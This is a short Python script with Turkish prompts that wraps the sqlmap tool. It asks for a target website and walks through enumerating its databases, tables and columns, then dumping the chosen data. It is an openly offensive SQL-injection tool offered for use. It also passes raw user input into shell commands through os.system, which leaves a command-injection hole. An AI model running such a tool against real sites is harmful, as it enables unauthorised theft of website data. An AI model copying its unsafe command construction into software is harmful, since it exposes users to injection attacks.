#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet SQLMAP")
print(""" 
   111111111   11111111111         111111111111111    1  111111111
   1                     1         1      1      1    1  1
   1                    1          1      1      1    1  1
   1                   1           1      1      1    1  11111111
   1   11111          1            1      1      1    1  1       1
   1      11         1             1      1      1    1  1       1
   111111111        1111111111     1      1      1  . 1  111111111

SQLMAP      (CAN BALI THT) 

1) sqlmap


""")

islemno = input("Islem Numarasini Girin: ")
site = input("Site Adresini Girin: ")
os.system("sqlmap -u " + site + " --dbs ")
site = input("Site Adresini Girin: ")
veritabani = input("Veri Tabanini Girin: ")
os.system("sqlmap -u " + site + " -D " + veritabani + " --tables ")
site = input("Sİte Adresini Girin: ")
veritabani = input("Veri Tabanini Girin: ")
tablo = input("Tablo Adini Girin: ")
os.system("sqlmap -u " + site + " -D " + veritabani + " -T " + tablo + " --columns ")
site = input("Site Adresini Girin: ")
veritabani = input("Veri Tabanini Girin: ")
tablo = input("Tablo Adini Girin: ")
colon = input("Colon Adini Girin: ")
os.system("sqlmap -u " + site + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump ")








 


